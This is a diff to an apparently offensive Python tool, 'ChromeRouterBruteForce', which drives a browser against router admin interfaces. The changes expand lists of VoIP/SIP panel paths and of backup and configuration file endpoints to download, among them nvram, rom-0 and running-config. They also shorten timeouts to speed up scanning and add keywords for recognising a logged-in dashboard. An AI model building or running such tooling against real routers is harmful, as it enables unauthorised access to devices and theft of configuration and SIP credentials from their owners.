@@ -1084,7 +1084,7 @@ class ChromeRouterBruteForce:
         try:
             print(f"{Colors.CYAN}[*] Getting brand-specific VoIP/SIP paths...{Colors.END}")
             
-            # Brand-specific VoIP/SIP paths (expanded based on web research)
+            # Comprehensive brand-specific VoIP/SIP paths (expanded based on web research)
             brand_paths = {
                 'tp-link': [
                     '/voip', '/sip', '/voice', '/telephony', '/phone',
@@ -1553,11 +1553,11 @@ class ChromeRouterBruteForce:
             return []
     
     def scan_advanced_paths(self, base_url):
-        """Scan advanced paths based on router firmware patterns"""
+        """Scan advanced paths based on router firmware patterns with optimized timeout"""
         try:
             print(f"{Colors.CYAN}[*] Scanning advanced firmware paths...{Colors.END}")
             
-            # Advanced paths based on common router firmware
+            # Advanced paths based on common router firmware (optimized list)
             advanced_paths = [
                 # OpenWrt patterns
                 "/cgi-bin/luci", "/cgi-bin/luci/admin", "/cgi-bin/luci/admin/network",
@@ -1628,9 +1628,10 @@ class ChromeRouterBruteForce:
                     test_url = f"{base_url.rstrip('/')}{path}"
                     print(f"{Colors.BLUE}[*] Testing advanced path: {test_url}{Colors.END}")
                     
-                    # Navigate to path
+                    # Navigate to path with optimized timeout
+                    self.driver.set_page_load_timeout(5)  # Reduced timeout for faster scanning
                     self.driver.get(test_url)
-                    time.sleep(1)
+                    time.sleep(0.5)  # Reduced wait time
                     
                     # Check if path exists and has VoIP content
                     if "404" not in self.driver.title.lower() and "not found" not in self.driver.page_source.lower():
@@ -1663,25 +1664,88 @@ class ChromeRouterBruteForce:
         try:
             print(f"{Colors.CYAN}[*] Attempting to download router backup file...{Colors.END}")
             
-            # Common backup file paths and endpoints
+            # Comprehensive backup file paths and endpoints
             backup_paths = [
+                # CGI-BIN paths
                 "/cgi-bin/backup.cgi", "/cgi-bin/backup", "/cgi-bin/download.cgi",
                 "/cgi-bin/export.cgi", "/cgi-bin/config.cgi", "/cgi-bin/settings.cgi",
+                "/cgi-bin/config", "/cgi-bin/settings", "/cgi-bin/export", "/cgi-bin/download", 
+                "/cgi-bin/firmware", "/cgi-bin/rom-0", "/cgi-bin/rom-1", "/cgi-bin/nvram",
+                "/cgi-bin/startup-config", "/cgi-bin/running-config", "/cgi-bin/current-config",
+                "/cgi-bin/config.bin", "/cgi-bin/backup.bin", "/cgi-bin/settings.bin",
+                "/cgi-bin/config.txt", "/cgi-bin/backup.txt", "/cgi-bin/settings.txt",
+                "/cgi-bin/config.xml", "/cgi-bin/backup.xml", "/cgi-bin/settings.xml",
+                "/cgi-bin/config.json", "/cgi-bin/backup.json", "/cgi-bin/settings.json",
+                
+                # Admin paths
                 "/admin/backup.cgi", "/admin/download.cgi", "/admin/export.cgi",
+                "/admin/backup", "/admin/config", "/admin/settings", "/admin/export", 
+                "/admin/download", "/admin/firmware", "/admin/config.bin", "/admin/backup.bin",
+                "/admin/settings.bin", "/admin/config.txt", "/admin/backup.txt", "/admin/settings.txt",
+                
+                # Config paths
                 "/config/backup.cgi", "/config/download.cgi", "/config/export.cgi",
+                "/config/backup", "/config/download", "/config/export", "/config/config.bin",
+                "/config/backup.bin", "/config/settings.bin", "/config/config.txt",
+                "/config/backup.txt", "/config/settings.txt",
+                
+                # Settings paths
                 "/settings/backup.cgi", "/settings/download.cgi", "/settings/export.cgi",
+                "/settings/backup", "/settings/download", "/settings/export", "/settings/config.bin",
+                "/settings/backup.bin", "/settings/settings.bin", "/settings/config.txt",
+                "/settings/backup.txt", "/settings/settings.txt",
+                
+                # System paths
                 "/system/backup.cgi", "/system/download.cgi", "/system/export.cgi",
+                "/system/backup", "/system/download", "/system/export", "/system/config.bin",
+                "/system/backup.bin", "/system/settings.bin", "/system/config.txt",
+                "/system/backup.txt", "/system/settings.txt",
+                
+                # Tools paths
                 "/tools/backup.cgi", "/tools/download.cgi", "/tools/export.cgi",
+                "/tools/backup", "/tools/download", "/tools/export", "/tools/config.bin",
+                "/tools/backup.bin", "/tools/settings.bin", "/tools/config.txt",
+                "/tools/backup.txt", "/tools/settings.txt",
+                
+                # Maintenance paths
                 "/maintenance/backup.cgi", "/maintenance/download.cgi", "/maintenance/export.cgi",
-                "/cgi-bin/backup", "/cgi-bin/config", "/cgi-bin/settings",
-                "/cgi-bin/export", "/cgi-bin/download", "/cgi-bin/firmware",
-                "/admin/backup", "/admin/config", "/admin/settings",
-                "/admin/export", "/admin/download", "/admin/firmware",
-                "/config/backup", "/config/download", "/config/export",
-                "/settings/backup", "/settings/download", "/settings/export",
-                "/system/backup", "/system/download", "/system/export",
-                "/tools/backup", "/tools/download", "/tools/export",
-                "/maintenance/backup", "/maintenance/download", "/maintenance/export"
+                "/maintenance/backup", "/maintenance/download", "/maintenance/export",
+                "/maintenance/config.bin", "/maintenance/backup.bin", "/maintenance/settings.bin",
+                
+                # Advanced paths
+                "/advanced/backup.cgi", "/advanced/download.cgi", "/advanced/export.cgi",
+                "/advanced/backup", "/advanced/download", "/advanced/export",
+                
+                # Management paths
+                "/management/backup.cgi", "/management/download.cgi", "/management/export.cgi",
+                "/management/backup", "/management/download", "/management/export",
+                
+                # Control paths
+                "/control/backup.cgi", "/control/download.cgi", "/control/export.cgi",
+                "/control/backup", "/control/download", "/control/export",
+                
+                # Panel paths
+                "/panel/backup.cgi", "/panel/download.cgi", "/panel/export.cgi",
+                "/panel/backup", "/panel/download", "/panel/export",
+                
+                # Interface paths
+                "/interface/backup.cgi", "/interface/download.cgi", "/interface/export.cgi",
+                "/interface/backup", "/interface/download", "/interface/export",
+                
+                # Web paths
+                "/web/backup.cgi", "/web/download.cgi", "/web/export.cgi",
+                "/web/backup", "/web/download", "/web/export",
+                
+                # Direct file paths
+                "/backup.cfg", "/config.cfg", "/settings.cfg", "/configuration.cfg",
+                "/backup.bin", "/config.bin", "/settings.bin", "/configuration.bin",
+                "/backup.txt", "/config.txt", "/settings.txt", "/configuration.txt",
+                "/backup.xml", "/config.xml", "/settings.xml", "/configuration.xml",
+                "/backup.json", "/config.json", "/settings.json", "/configuration.json",
+                "/nvram.bin", "/nvram.cfg", "/nvram.txt", "/nvram.xml",
+                "/rom-0", "/rom-1", "/startup-config", "/running-config", "/current-config",
+                "/device.cfg", "/router.cfg", "/gateway.cfg", "/modem.cfg",
+                "/firmware.bin", "/firmware.cfg", "/firmware.txt", "/firmware.xml"
             ]
             
             backup_file = None
@@ -2258,7 +2322,12 @@ class ChromeRouterBruteForce:
                 'home', 'overview', 'summary', 'statistics', 'traffic', 'bandwidth',
                 'users', 'clients', 'connected devices', 'wifi', 'ethernet',
                 'internet', 'connection', 'ip address', 'subnet', 'dns server',
-                'time', 'date', 'timezone', 'language', 'theme', 'appearance'
+                'time', 'date', 'timezone', 'language', 'theme', 'appearance',
+                'broadband', 'adsl', 'cable', 'fiber', 'access point', 'switch',
+                'broadcom', 'qualcomm', 'mediatek', 'realtek', 'cisco', 'netgear',
+                'linksys', 'tp-link', 'd-link', 'asus', 'belkin', 'buffalo',
+                'zyxel', 'huawei', 'zte', 'tenda', 'main', 'index', 'menu',
+                'tools', 'utilities', 'diagnostics', 'logs', 'maintenance'
             ]
             
             # Check for login page indicators (negative)
